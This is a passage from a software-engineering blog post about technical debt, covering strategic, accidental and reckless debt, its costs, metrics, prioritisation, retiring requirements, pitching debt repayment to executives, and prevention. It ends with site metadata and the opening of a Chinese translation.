now? What’s the opportunity cost of not doing it right? 5. Get Team Agreement Ensure everyone understands and accepts the trade-off: Discuss in team meetings or planning sessions Document who approved the decision Make sure future maintainers will understand the context Align on the payback plan 6. Maintain Test Coverage Even when taking shortcuts, protect yourself: Write tests for the shortcut implementation Tests make it safer to refactor later Tests document expected behavior Tests catch regressions when you pay back the debt 7. Create a Repayment Plan Before writing the shortcut code, plan how you’ll fix it: What’s the proper solution? What needs to change to implement it? What dependencies or prerequisites are needed? How will you test the refactored version? graph TB A([🎯 Business NeedRequires Speed]) --> B{Is DebtJustified?} B -->|No| C([✅ Build ProperlyNo Shortcuts]) B -->|Yes| D([📝 Document Debt& Rationale]) D --> E([🔒 Isolate ImpactClear Boundaries]) E --> F([📅 Set RepaymentDate & Plan]) F --> G([⚡ ImplementShortcut]) G --> H([🧪 Add TestsFor Safety]) H --> I([📊 Track & MonitorUntil Repaid]) style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style I fill:#fff3e0,stroke:#f57c00,stroke-width:2px 🎬 Strategic Debt Done RightA startup needed to demo their product to investors in 3 weeks. They decided to take on deliberate debt: What they did: Documented: &quot;Using in-memory storage instead of database for MVP&quot; Isolated: Created a storage interface that could be swapped later Set deadline: &quot;Implement proper database after funding secured&quot; Estimated cost: &quot;2 weeks to add database + migration&quot; Wrote tests: Comprehensive tests for the storage interface Created plan: Detailed design doc for database implementation Result: Shipped demo on time, secured funding Paid back debt in 1.5 weeks (faster than estimated) Tests ensured no regressions during refactoring Clean interface made the swap straightforward This is strategic debt done right: deliberate, documented, and repaid. Red Flags: When Debt Becomes Dangerous Watch for these warning signs that debt is getting out of control: No documentation: Team can’t list what debt exists No deadlines: Debt items have no planned repayment date Spreading: Shortcuts in one area forcing shortcuts elsewhere Forgotten: Debt older than 6 months with no progress Accumulating: Taking on new debt before paying old debt Blocking: Debt preventing new features or improvements If you see these signs, stop taking on new debt and focus on payback. Accidental Debt This debt emerges from lack of knowledge or changing requirements. The team did their best with available information, but better approaches emerged later. Examples include: Choosing a framework that proved inadequate Designing an API that doesn’t match actual usage patterns Implementing features before requirements were fully understood Characteristics: Discovered over time, requires refactoring as understanding improves. Bit Rot Debt Code that was once good gradually becomes problematic as the ecosystem evolves. Examples include: Dependencies with security vulnerabilities Code using deprecated APIs Patterns that were best practices five years ago but aren’t today Characteristics: Inevitable, requires continuous maintenance and updates. Reckless Debt This is debt from poor practices, lack of discipline, or ignoring known best practices. Examples include: No tests because “testing takes too long” Copy-pasting code instead of creating reusable functions Ignoring code review feedback to ship faster Characteristics: Avoidable, often indicates process or culture problems. ⚠️ The Danger of Reckless DebtWhile deliberate debt can be strategic, reckless debt is almost always harmful. It indicates systemic problems in development practices that will continue generating debt until addressed at the root cause level. The True Cost of Technical Debt Technical debt’s cost isn’t just about messy code - it impacts every aspect of software development. Reduced Development Velocity As debt accumulates, simple changes take longer. Adding a feature that should take hours requires days because developers must navigate convoluted code, work around limitations, and avoid breaking fragile systems. (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_48c3529b9')); var option = { \"title\": { \"text\": \"Development Velocity Over Time\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"With Debt Management\", \"Without Debt Management\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"Month 1\", \"Month 3\", \"Month 6\", \"Month 9\", \"Month 12\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Features Delivered\" }, \"series\": [ { \"name\": \"With Debt Management\", \"type\": \"line\", \"data\": [10, 12, 13, 14, 15], \"itemStyle\": { \"color\": \"#388e3c\" } }, { \"name\": \"Without Debt Management\", \"type\": \"line\", \"data\": [12, 11, 8, 5, 3], \"itemStyle\": { \"color\": \"#c62828\" } } ] }; chart.setOption(option); } })(); Increased Bug Rate Poorly structured code is harder to understand and easier to break. Developers make mistakes because they can’t see the full impact of their changes. Tests are inadequate or missing entirely, so bugs slip through to production. Higher Onboarding Costs New team members struggle to become productive when the codebase is a maze of workarounds and undocumented decisions. What should take weeks stretches into months as they navigate technical debt landmines. Team Morale Impact Developers hate working in messy codebases. The constant frustration of fighting technical debt drains motivation and creativity. Good engineers leave for opportunities where they can write quality code. Business Risk Technical debt creates fragility. Systems become harder to change, making it difficult to respond to market opportunities or competitive threats. In extreme cases, debt can make entire systems unmaintainable, requiring costly rewrites. 🎬 Real-World ImpactA fintech startup accumulated significant technical debt racing to launch. Initially, they shipped features rapidly. But by month six, development velocity had dropped 70%. Simple changes required touching dozens of files. Tests were unreliable. Deployments frequently broke production. The team spent three months paying down debt - refactoring core systems, adding tests, and documenting architecture. Development velocity recovered, and they could finally ship features reliably again. The lesson: ignoring debt doesn't make it disappear. It just makes the eventual reckoning more painful. Recognizing Technical Debt How do you know when technical debt is becoming a problem? Watch for these warning signs: Code Smells Duplicated code: Same logic repeated in multiple places Long methods: Functions that do too many things Large classes: Classes with too many responsibilities Long parameter lists: Functions requiring many arguments Divergent change: One class frequently modified for different reasons Shotgun surgery: Single change requires modifications across many classes Process Indicators Slowing velocity: Features that used to take days now take weeks Increasing bug rate: More defects reaching production Deployment fear: Team anxious about releases due to frequent breakage Difficult onboarding: New developers taking months to become productive Refactoring avoidance: Team reluctant to improve code due to risk Team Signals Developer frustration: Complaints about code quality Workaround culture: Team routinely works around problems instead of fixing them Knowledge silos: Only certain people can work on certain parts of the system Turnover: Experienced developers leaving for better codebases 💡 The Boy Scout Rule&quot;Leave the code better than you found it.&quot; Even small improvements compound over time. Fix one code smell per commit. Add one test. Improve one function name. These micro-refactorings prevent debt from accumulating without requiring dedicated refactoring sprints. Measuring Technical Debt You can’t manage what you don’t measure. While technical debt is partly subjective, several metrics provide objective indicators: Code Quality Metrics Code Coverage: Percentage of code exercised by tests. Low coverage indicates testing debt. Cyclomatic Complexity: Measures code complexity based on decision points. High complexity indicates code that’s hard to understand and test. Code Duplication: Percentage of duplicated code. High duplication indicates maintenance burden. Technical Debt Ratio: Estimated cost to fix debt divided by cost to rebuild from scratch. Industry standard suggests keeping this below 5%. Time-Based Metrics Time to Add Feature: Track how long similar features take over time. Increasing duration indicates accumulating debt. Bug Fix Time: Average time to resolve defects. Increasing time suggests code is becoming harder to work with. Onboarding Time: How long new developers take to become productive. Increasing time indicates growing complexity. Static Analysis Tools Modern tools can automatically detect debt indicators: SonarQube: Comprehensive code quality and security analysis CodeClimate: Maintainability and test coverage tracking ESLint/Pylint: Language-specific linters catching common issues Dependency checkers: Identify outdated or vulnerable dependencies 📊 Establishing BaselinesMetrics are most valuable when tracked over time. Establish baselines for your key metrics, then monitor trends. A single snapshot tells you little; trends reveal whether debt is growing or shrinking. Managing Technical Debt Effective debt management requires strategy, discipline, and continuous effort. Here’s how to approach it: The Observe-Plan-Act-Reflect Cycle Managing technical debt follows a continuous improvement cycle: graph LR A([🔍 ObserveIdentify Debt]) --> B([🎯 PlanPrioritize Work]) B --> C([⚡ ActRefactor & Fix]) C --> D([💭 ReflectMeasure Impact]) D --> A style A fill:#e1f5ff,stroke:#0288d1,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px Observe: Regularly assess your codebase. Use static analysis tools, review metrics, and listen to developer feedback. Where is debt accumulating? What’s causing the most pain? Plan: Prioritize debt based on impact and effort. Not all debt deserves immediate attention. Focus on debt that’s actively slowing development or increasing risk. Act: Address debt through refactoring, adding tests, updating dependencies, or improving documentation. Make debt work visible and allocate time for it. Reflect: Measure the impact of your efforts. Did velocity improve? Are bugs decreasing? Use these insights to refine your approach. Prioritization Framework Use this matrix to prioritize technical debt: Impact Low Effort High Effort High Impact Do immediately Schedule soon Medium Impact Do when convenient Evaluate carefully Low Impact Quick wins only Probably ignore High Impact, Low Effort: These are your quick wins. Fix them immediately. High Impact, High Effort: Schedule dedicated time for these. They’re worth the investment. Low Impact, High Effort: Usually not worth addressing unless they’re blocking other work. Allocation Strategies The 20% Rule: Dedicate 20% of each sprint to debt reduction. This prevents debt from accumulating while maintaining feature velocity. Debt Sprints: Periodically schedule entire sprints focused on debt reduction. Use these after major releases or when debt reaches critical levels. Opportunistic Refactoring: When working on a feature, improve the surrounding code. This distributes debt work across all development activities. Strangler Pattern: For large-scale refactoring, gradually replace old systems with new implementations rather than attempting big-bang rewrites. Requirement Elimination: Sometimes the best way to eliminate debt is to eliminate the requirement that created it. ⚠️ The Rewrite TrapWhen debt becomes overwhelming, teams often consider complete rewrites. This is usually a mistake. Rewrites take longer than expected, introduce new bugs, and accumulate new debt. Prefer incremental refactoring unless the system is truly unmaintainable. The Creative Approach: Eliminate Requirements Instead of Repaying Debt The most overlooked strategy for managing technical debt is questioning whether the code needs to exist at all. Instead of refactoring complex code, ask: “Do we still need this feature?” The Core Insight: Every line of code is a liability. The best code is no code. If you can eliminate requirements, you eliminate the debt associated with them. Why Requirements Become Obsolete Market Evolution: Features built for yesterday’s market may be irrelevant today. That custom reporting module? Users now export to Excel instead. User Behavior Changed: Analytics show 0.1% of users touch a feature that consumes 20% of your codebase complexity. Business Pivot: The company shifted strategy, but the code supporting the old strategy remains. Workarounds Exist: Users found better ways to accomplish their goals, making the original feature redundant. Compliance Changed: Regulations that required certain features were updated or removed. Better Alternatives: Third-party services now handle what you built custom solutions for. The Requirement Elimination Process 1. Identify Candidate Requirements Look for: Features with low usage (&lt; 5% of users) Code that’s expensive to maintain Functionality duplicated elsewhere Features that block architectural improvements Requirements from stakeholders who left the company 2. Gather Usage Data Before proposing elimination, collect evidence: ## Feature Analysis: Advanced Search Filters **Usage Data (Last 90 Days):** - Total users: 10,000 - Users who accessed feature: 47 (0.47%) - Average uses per user: 1.2 - Support tickets: 12 (all confusion about how it works) **Maintenance Cost:** - Code complexity: High (touches 15 files) - Bug rate: 3 bugs per quarter - Time to modify: 8 hours average - Blocks migration to new search engine **Business Value:** - Revenue impact: $0 (not a paid feature) - Customer requests: 0 in past year - Competitive advantage: None (competitors don&#39;t have it either) 3. Propose Requirement Retirement Present to stakeholders: Option A: Keep Feature Cost: 40 hours/quarter maintenance Benefit: 47 users (0.47%) can use it Blocks: Migration to new search architecture Option B: Remove Feature Cost: 8 hours to remove code Benefit: Eliminate 15 files of complexity, unblock search migration Risk: 47 users lose functionality (can use basic search instead) Mitigation: Email affected users 30 days before removal 4. Communicate the Change If approved, notify affected users: Subject: Advanced Search Filters Retiring August 1st We&#39;re simplifying our search experience. The Advanced Search Filters feature will be retired on August 1st, 2020. Why? Usage data shows 99.5% of users rely on our standard search, which we&#39;re actively improving. What to do: Standard search now includes the most-used filters from Advanced Search. For complex queries, you can export results and filter in Excel. Questions? Reply to this email. 5. Remove the Code Once the requirement is retired: Delete the code (don’t just comment it out) Remove related tests Update documentation Remove UI elements Clean up database tables if safe Celebrate the reduction in complexity graph TB A([📊 AnalyzeFeature Usage]) --> B{WorthKeeping?} B -->|Yes| C([✅ Keep & Maintain]) B -->|No| D([📋 ProposeRetirement]) D --> E{StakeholderApproval?} E -->|No| C E -->|Yes| F([📢 NotifyUsers]) F --> G([🗑️ RemoveCode]) G --> H([🎉 DebtEliminated]) style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style H fill:#e8f5e9,stroke:#388e3c,stroke-width:3px Types of Requirements to Challenge Non-Functional Requirements (NFRs): Performance Requirements: “System must handle 1M requests/second” - but actual peak is 10K. Relaxing this eliminates complex caching layers. Availability Requirements: “99.99% uptime” for an internal tool used during business hours. Dropping to 99.9% eliminates expensive redundancy. Scalability Requirements: “Must scale to 100M users” when you have 10K. Removing premature scaling eliminates architectural complexity. Browser Support: “Must support IE11” when analytics show 0.01% IE11 users. Dropping it eliminates polyfills and workarounds. Functional Requirements (FRs): Unused Features: Features that seemed important but users ignore. Redundant Features: Multiple ways to do the same thing. Legacy Integrations: Integrations with systems no longer in use. Over-Engineered Solutions: Complex implementations for simple problems. 🎬 Real Requirement Elimination SuccessA SaaS company had a custom PDF generation engine that was a maintenance nightmare. Analysis revealed: Usage: 200 users/month generated PDFs (2% of user base) Cost: 120 hours/quarter maintaining the engine Debt: Blocked upgrade to new framework Solution: Replaced with third-party PDF service ($50/month) Result: Deleted 8,000 lines of complex code Eliminated 3 dependencies with security issues Unblocked framework upgrade Saved 120 hours/quarter Cost: $50/month vs. $15,000/quarter in developer time The requirement didn't disappear - but the debt did. Negotiating Requirement Changes With Product Managers: “This feature costs us 40 hours per quarter to maintain and is used by 0.5% of users. What if we removed it and invested those 40 hours in Feature X that 80% of users are requesting?” With Customers: “We’re focusing our development on the features 95% of customers use daily. Feature Y will be retired, but we’re adding Features A, B, and C that solve the same problem better.” With Executives: “We can deliver the Q4 roadmap 30% faster by retiring these 5 low-usage features. This eliminates 12,000 lines of code that slow down every change we make.” The 80/20 Rule Applied Often, 80% of your technical debt comes from 20% of your features - usually the least-used ones. Eliminating that 20% can eliminate 80% of your maintenance burden. Audit Exercise: List all features in your application Add usage data for each (users, frequency, revenue impact) Add maintenance cost for each (bugs, complexity, time to modify) Sort by cost-to-value ratio Challenge the bottom 20% 💡 The Courage to DeleteDevelopers love building features. Deleting them feels like failure. But every feature you remove: Reduces cognitive load Speeds up development Decreases bug surface area Simplifies testing Improves user experience (fewer confusing options) Deletion is not failure - it's strategic focus. When NOT to Eliminate Requirements Regulatory/Compliance: If law requires it, you can’t remove it (but you can simplify implementation). Contractual Obligations: If customers have contracts guaranteeing features, negotiate before removing. Critical Path: Features with low usage but high importance (e.g., password reset used rarely but essential). Strategic Differentiators: Features that define your competitive advantage, even if usage is low. Safety/Security: Features that protect users or data, regardless of direct usage. Combining Approaches The most effective strategy combines requirement elimination with traditional debt paydown: Eliminate: Remove 20% of features (lowest value, highest cost) Simplify: Reduce requirements for 30% of features (“good enough” vs. “perfect”) Refactor: Pay down debt in the remaining 50% of high-value features This approach delivers faster results than refactoring everything. ✨ The Ultimate Debt ReductionThe fastest way to eliminate technical debt is to eliminate the code entirely. Before spending weeks refactoring a complex module, ask: &quot;Do we still need this?&quot; The answer might save you months of work. Seeking Sponsorship for Technical Debt Repayment Technical debt is invisible to non-technical stakeholders. Getting executive sponsorship requires translating technical problems into business impact. When to Seek Sponsorship Debt Blocking Business Goals: When technical debt prevents delivering features customers need or executives promised. Velocity Crisis: When development speed has dropped significantly and the team can’t meet commitments. Quality Crisis: When production incidents, customer complaints, or security vulnerabilities are increasing. Talent Risk: When good developers are leaving due to codebase frustration, or hiring is difficult because of reputation. Competitive Threat: When competitors are moving faster because you’re slowed by debt. Major Initiative Ahead: Before starting a large project that will be hampered by existing debt. 📊 Timing MattersSeek sponsorship when you have evidence, not just complaints. Wait until you can show metrics, incidents, or clear business impact. Premature requests without data get dismissed as &quot;developer perfectionism.&quot; Strategy for Getting Sponsorship 1. Speak Business Language, Not Technical Jargon Don’t say: “Our authentication module has high cyclomatic complexity and lacks proper abstraction.” Do say: “Our login system is fragile. Last month, a simple change caused a 2-hour outage affecting 10,000 users. Each fix takes 3x longer than it should.” Translation Guide: Technical Term Business Impact High complexity Slower feature delivery, more bugs Poor test coverage Production incidents, customer impact Outdated dependencies Security vulnerabilities, compliance risk Tight coupling Can’t add features without breaking others Code duplication Same bug appears in multiple places Missing documentation New developers take months to onboard 2. Quantify the Cost Executives understand numbers. Show the debt’s cost in terms they care about: Development Velocity Impact: “Features that took 2 weeks now take 6 weeks” “We’re delivering 40% fewer features per quarter” “Simple changes require touching 20+ files” Financial Impact: “We spent $50K in overtime fixing production incidents caused by this debt” “Onboarding costs increased from $10K to $30K per developer” “We lost a $200K deal because we couldn’t deliver the feature in time” Customer Impact: “Customer satisfaction dropped from 4.5 to 3.2 stars” “Support tickets increased 60% due to bugs” “Three enterprise customers threatened to leave” 3. Show the Trend One data point is an anecdote. A trend is a crisis. (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_a203eb570')); var option = { \"title\": { \"text\": \"Feature Delivery Velocity Declining\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"xAxis\": { \"type\": \"category\", \"data\": [\"Q1 2019\", \"Q2 2019\", \"Q3 2019\", \"Q4 2019\", \"Q1 2020\", \"Q2 2020\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Features Delivered\" }, \"series\": [{ \"type\": \"line\", \"data\": [15, 14, 12, 9, 7, 5], \"itemStyle\": { \"color\": \"#c62828\" }, \"markLine\": { \"data\": [ { \"type\": \"average\", \"name\": \"Average\" } ] } }] }; chart.setOption(option); } })(); Show declining velocity, increasing incidents, or rising costs over time. Trends are undeniable. 4. Present Options with Trade-offs Don’t demand a solution. Present options: Option A: Do Nothing Cost: $0 upfront Impact: Velocity continues declining 10% per quarter Risk: Major outage likely within 6 months Timeline: Immediate Option B: Incremental Paydown (Recommended) Cost: 20% of sprint capacity for 6 months Impact: Velocity stabilizes, then improves 30% Risk: Minimal, work happens alongside features Timeline: 6 months to significant improvement Option C: Dedicated Refactor Sprint Cost: 2 sprints with no new features Impact: Velocity improves 50% immediately after Risk: Feature delivery pauses for 4 weeks Timeline: 1 month to completion Option D: Complete Rewrite Cost: 6-12 months, entire team Impact: Modern architecture, but new bugs Risk: High - may take longer, accumulate new debt Timeline: 12+ months Let executives choose based on business priorities. 5. Connect to Strategic Goals Align debt repayment with company objectives: “To hit our Q4 revenue target, we need to ship 3 major features. Current debt means we can only deliver 1.” “The board wants us to scale to 1M users. Our current architecture breaks at 100K.” “We’re hiring 5 developers next quarter. With current debt, their onboarding will cost $150K instead of $50K.” 6. Propose a Pilot Reduce risk by starting small: “Let us spend one sprint paying down debt in the authentication module. We’ll measure the impact on velocity and bug rates. If it works, we’ll expand to other areas.” Pilots prove value with minimal commitment. How to Present the Case Prepare a One-Page Executive Summary: # Technical Debt Repayment Proposal ## Problem Development velocity has dropped 60% over 18 months. Features that took 2 weeks now take 5 weeks. We&#39;re missing commitments and losing competitive advantage. ## Root Cause Accumulated technical debt in core modules. Code is fragile, poorly tested, and difficult to modify safely. ## Business Impact - Lost $300K deal (couldn&#39;t deliver feature in time) - Customer satisfaction dropped from 4.5 to 3.2 - 3 senior developers left citing codebase frustration - Production incidents up 80% year-over-year ## Proposed Solution Dedicate 20% of sprint capacity to debt reduction for 6 months. ## Expected Outcomes - Velocity improves 40% within 6 months - Production incidents decrease 50% - Developer satisfaction improves - Onboarding time reduces from 3 months to 6 weeks ## Cost - 20% capacity &#x3D; 2 fewer features per quarter - Alternative: Continue current trajectory, velocity drops to zero in 12 months ## Request Approval to allocate 20% of sprint capacity to technical debt reduction, with monthly progress reviews. Present with Visuals: graph TB A([Current State5 features/quarterHigh incidents]) --> B{Invest inDebt Reduction?} B -->|No| C([6 Months Later2 features/quarterCrisis mode]) B -->|Yes| D([6 Months Later12 features/quarterStable system]) style A fill:#ffebee,stroke:#c62828,stroke-width:2px style C fill:#b71c1c,stroke:#000,stroke-width:3px,color:#fff style D fill:#e8f5e9,stroke:#388e3c,stroke-width:3px Anticipate Objections: Objection: “We don’t have time, we need features now.” Response: “We’re already paying the time cost through slower delivery. This investment recovers that time.” Objection: “Can’t developers just write better code?” Response: “The debt is already there. We need dedicated time to fix it, not just avoid making it worse.” Objection: “How do we know this will work?” Response: “Let’s run a 2-week pilot on one module and measure the results. Low risk, high learning.” Objection: “This sounds expensive.” Response: “Doing nothing is more expensive. We’re losing $X per month in lost deals and incidents. This pays for itself in Y months.” Building Ongoing Sponsorship Once you get initial approval, maintain sponsorship: 1. Report Progress Regularly Monthly updates showing: Debt items completed Velocity improvements Incident reductions Developer satisfaction scores 2. Celebrate Wins When debt reduction enables a business win, publicize it: “We delivered Feature X in 2 weeks instead of 6 because we refactored Module Y” “Zero authentication incidents this month after refactoring login system” 3. Make Debt Visible Create a dashboard executives can check: Technical debt ratio trending down Velocity trending up Incident count trending down Test coverage trending up 4. Connect to Business Outcomes Always tie technical improvements to business results: “Faster delivery” → “Beat competitor to market” “Fewer bugs” → “Higher customer satisfaction” “Better architecture” → “Can scale to 10x users” 🎬 Successful Sponsorship StoryA development team's velocity had dropped 70% over 2 years. The engineering manager prepared a presentation: Data Presented: Chart showing declining velocity List of missed commitments and lost deals Calculation: debt was costing $500K/year in lost productivity Proposal: 6-month debt reduction program Executive Response: &quot;Why didn't you tell us sooner? This explains why we're missing targets. Approved.&quot; Results After 6 Months: Velocity improved 60% Production incidents down 75% Team delivered 3 major features that were previously &quot;impossible&quot; Engineering manager got promoted for turning the team around The key: Speaking business language and showing clear ROI. Red Flags: When Sponsorship Requests Fail Vague Complaints: “The code is messy” doesn’t get budget. “We’re losing $50K/month to incidents” does. No Data: Anecdotes without metrics get dismissed as opinions. All-or-Nothing: Demanding 6 months with no features gets rejected. Proposing 20% capacity gets approved. Technical Jargon: Executives don’t care about “tight coupling.” They care about “can’t add features without breaking others.” No Business Connection: If you can’t explain why this matters to customers or revenue, you won’t get sponsorship. 💡 The Golden RuleExecutives sponsor initiatives that solve business problems, not technical problems. Your job is translating technical debt into business impact. Master this translation, and you'll get the sponsorship you need. Preventing Technical Debt Prevention is easier than cure. Build practices that minimize debt accumulation: Design-First Approach One of the most effective ways to prevent technical debt is thinking before coding. Design-first means understanding the problem, exploring solutions, and making architectural decisions before writing implementation code. Why Design-First Prevents Debt: Prevents Accidental Debt: When you design first, you catch architectural mismatches before they’re embedded in code. You discover that your initial API design doesn’t support future requirements, or that your database schema won’t scale - while these are still easy to fix. Reduces Rework: Changing a design document takes minutes. Refactoring implemented code takes hours or days. Design-first frontloads the thinking, reducing costly implementation changes. Enables Better Decisions: Design phase allows you to evaluate trade-offs deliberately. Should you use microservices or a monolith? SQL or NoSQL? These decisions are hard to reverse once implemented. Improves Communication: Design documents create shared understanding across the team. Everyone knows what’s being built and why, reducing misaligned implementations that create debt. Catches Requirements Gaps: Designing forces you to think through edge cases, error handling, and integration points. You discover missing requirements before writing code that will need rework. graph TB A([📋 Requirements]) --> B([🎨 Design PhaseArchitecture & Planning]) B --> C{DesignReview} C -->|Issues Found| B C -->|Approved| D([💻 Implementation]) D --> E([✅ Matches DesignLess Debt]) A2([📋 Requirements]) --> D2([💻 Code FirstNo Design]) D2 --> F([🔧 Discover IssuesDuring Coding]) F --> G([📈 Accumulate DebtRework Required]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px Practical Design-First Practices: Architecture Decision Records (ADRs): Document significant decisions, alternatives considered, and rationale. This prevents future developers from wondering “why did they do it this way?” API Design Reviews: Design and review APIs before implementation. Mock them out, test with sample data, ensure they meet actual use cases. Database Schema Planning: Model your data before creating tables. Consider access patterns, relationships, and future growth. Proof of Concepts: For uncertain technical decisions, build small prototypes to validate approaches before committing to full implementation. Design Reviews: Have team members review designs before coding begins. Fresh perspectives catch issues you missed. 🎬 Design-First Success StoryA team was building a notification system. Instead of jumping into code, they spent two days designing: How notifications would be queued and delivered What happens when delivery fails How to handle rate limiting Database schema for tracking notification state During design review, they discovered their initial approach couldn't handle the required scale. They redesigned using a message queue architecture. This two-day design investment prevented weeks of refactoring that would have been needed if they'd discovered the scalability issue after implementation. When to Skip Design-First: Design-first isn’t always appropriate: Exploratory Work: When you’re experimenting to understand a problem, code-first exploration can be faster. Just treat the code as throwaway. Well-Understood Patterns: For routine features using established patterns, extensive design may be overkill. Prototypes and MVPs: When validating ideas quickly, deliberate technical debt may be acceptable. The key is being intentional. If you skip design, acknowledge you’re incurring debt and plan to address it. 💡 Lightweight DesignDesign-first doesn't mean weeks of UML diagrams and formal specifications. For most features, a simple document covering: What problem are we solving? What approach will we take? What are the key components and their interactions? What could go wrong? This takes 30-60 minutes and prevents hours of rework. Code Review Rigorous code review catches debt before it enters the codebase. Reviewers should ask: Is this code maintainable? Are there tests? Does this follow our standards? Are there simpler approaches? Automated Quality Gates Configure CI/CD pipelines to enforce quality standards: Minimum test coverage thresholds Complexity limits Security vulnerability scanning Dependency freshness checks Definition of Done Include quality criteria in your definition of done: Code reviewed and approved Tests written and passing Documentation updated No new static analysis warnings Technical Debt Register Maintain a visible register of known debt: What is the debt? Why was it incurred? What’s the impact? What’s the plan to address it? This transparency prevents debt from being forgotten and helps prioritize work. Continuous Learning Invest in team skills to prevent accidental debt: Regular training on best practices Architecture reviews Knowledge sharing sessions Pair programming ✨ Building a Quality CultureThe most effective debt prevention is cultural. When teams value code quality, take pride in their work, and feel empowered to push back on unrealistic deadlines, debt accumulates more slowly. Quality isn't a phase - it's a mindset. The Future: AI-Assisted Debt Management Looking ahead, artificial intelligence will transform how we manage technical debt. While today’s tools require human judgment to identify and prioritize debt, tomorrow’s AI agents will proactively detect, prioritize, and even automatically refactor problematic code. Imagine an AI assistant that: Continuously scans your codebase for debt indicators Prioritizes debt based on actual impact on development velocity Proposes refactoring strategies with estimated effort and benefit Automatically refactors low-risk debt during off-hours Learns your team’s coding standards and enforces them consistently This isn’t science fiction - the foundations exist today. As AI coding tools evolve from simple code completion to autonomous agents capable of understanding entire codebases, they’ll become powerful allies in the fight against technical debt. The key will be balancing automation with human judgment. AI can identify patterns and execute refactoring, but humans must make strategic decisions about priorities, acceptable trade-offs, and architectural direction. 🔮 Preparing for AI-Assisted RefactoringTo benefit from future AI tools: Maintain comprehensive tests (AI needs these to verify refactoring safety) Document architectural decisions (AI needs context to make good choices) Establish clear coding standards (AI needs rules to enforce) Build a culture of continuous improvement (AI amplifies existing practices) Conclusion: Debt is Inevitable, Management is Essential Technical debt isn’t a failure - it’s an inevitable part of software development. Every codebase accumulates debt as requirements change, technologies evolve, and teams learn better approaches. The question isn’t whether you’ll have technical debt. The question is whether you’ll manage it deliberately or let it manage you. Teams that treat debt as a strategic tool - consciously incurring it when beneficial, continuously paying it down, and preventing reckless accumulation - maintain high velocity and code quality over time. Teams that ignore debt find themselves trapped in codebases that resist change, frustrate developers, and ultimately require costly rewrites. The choice is yours. Will you manage your debt, or will your debt manage you? 💭 Remember&quot;Technical debt is like a credit card. Used wisely, it accelerates progress. Used recklessly, it leads to bankruptcy. The key is knowing when to borrow and always having a plan to pay it back.&quot; Practical Next Steps Ready to tackle technical debt in your codebase? Start here: Assess Current State: Run static analysis tools and review key metrics to understand your debt level Identify Pain Points: Ask your team what code causes the most frustration and slows them down Prioritize: Use the impact/effort matrix to identify high-value debt to address first Allocate Time: Commit to spending 20% of each sprint on debt reduction Measure Progress: Track velocity, bug rates, and developer satisfaction to validate improvements Prevent New Debt: Implement code review standards and automated quality gates Make it Visible: Create a debt register and discuss it in sprint planning Technical debt management isn’t a one-time project - it’s an ongoing practice. Start small, build momentum, and gradually transform your codebase from a burden into an asset. The best time to start managing technical debt was yesterday. The second best time is today.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Software Engineering","slug":"Software-Engineering","permalink":"https://neo01.com/tags/Software-Engineering/"},{"name":"Technical Debt","slug":"Technical-Debt","permalink":"https://neo01.com/tags/Technical-Debt/"},{"name":"Code Quality","slug":"Code-Quality","permalink":"https://neo01.com/tags/Code-Quality/"},{"name":"Refactoring","slug":"Refactoring","permalink":"https://neo01.com/tags/Refactoring/"}],"lang":"en"},{"title":"技術債：快速開發的隱藏成本","slug":"2020/07/Technical-Debt-The-Hidden-Cost-of-Moving-Fast-zh-TW","date":"un66fin66","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/07/Technical-Debt-The-Hidden-Cost-of-Moving-Fast/","permalink":"https://neo01.com/zh-TW/2020/07/Technical-Debt-The-Hidden-Cost-of-Moving-Fast/","excerpt":"程式碼中的每個捷徑都會產生必須連本帶利償還的債務。學習如何識別、衡量和管理技術債，避免它拖垮你的開發速度。","text":"每個軟體團隊都面臨同樣的誘惑：現在走捷徑，之後再修正。跳過重構。複製貼上那段程式碼。寫死設定值。今天先發布功能，明天再清理。 但明天永遠不會到來。 相反地，這些捷徑不斷累積。每一個都讓下一個功能更難建構。測試變得不穩定。部署變得危險。新開發者難以理解程式碼庫。原本只是幾個務實的決定，最終轉變成拖慢一切的沉重負擔。 這就是技術債——就像金融債務一樣，它會複利累積。 什麼是技術債？ Ward Cunningham 在 1992 年創造了「技術債」這個詞，用來描述完美程式碼與快速交付之間的權衡。就像金融債務讓你現在取得某物、之後再付款一樣，技術債讓你透過延遲程式碼品質工作來更快交付功能。 這個比喻很有力量，因為它捕捉了一個本質真理：債務本身並不壞。策略性債務可以加速成長。新創公司可能會刻意累積技術債，以在競爭對手之前驗證產品市場契合度。團隊可能會為了達成關鍵期限而走捷徑。 問題不在於債務本身——而在於未管理的債務。 為什麼技術債會像金融債務一樣複利累積 技術債的「利息」不是比喻——它是隨時間增長的真實成本。原因如下： 複利效應 對於金融債務，你要為本金支付利息。對於技術債，每次與有問題的程式碼互動時，你都要支付「利息」： 初始債務：你寫死一個設定值，節省 2 小時。 第一次利息支付：下一位開發者花 30 分鐘搞清楚為什麼設定在測試環境不能運作。 第二次利息支付：另一位開發者花 1 小時加入變通方法，因為他們無法輕易改變寫死的值。 第三次利息支付：QA 花 2 小時除錯為什麼測試在 CI 失敗但在本地通過。 第四次利息支付：新團隊成員在入職期間花 3 小時理解這些變通方法。 那個 2 小時的捷徑現在已經花費了 6.5 小時的「利息」——而債務仍未償還。它存在的時間越長，累積的利息就越多。 債務疊加債務 複利加速是因為新程式碼建立在舊債務之上： graph TB A([第 1 週：寫死設定節省 2 小時]) --> B([第 2 週：加入變通方法成本：1 小時]) B --> C([第 4 週：另一個變通方法成本：2 小時]) C --> D([第 8 週：功能被阻擋成本：8 小時]) D --> E([第 12 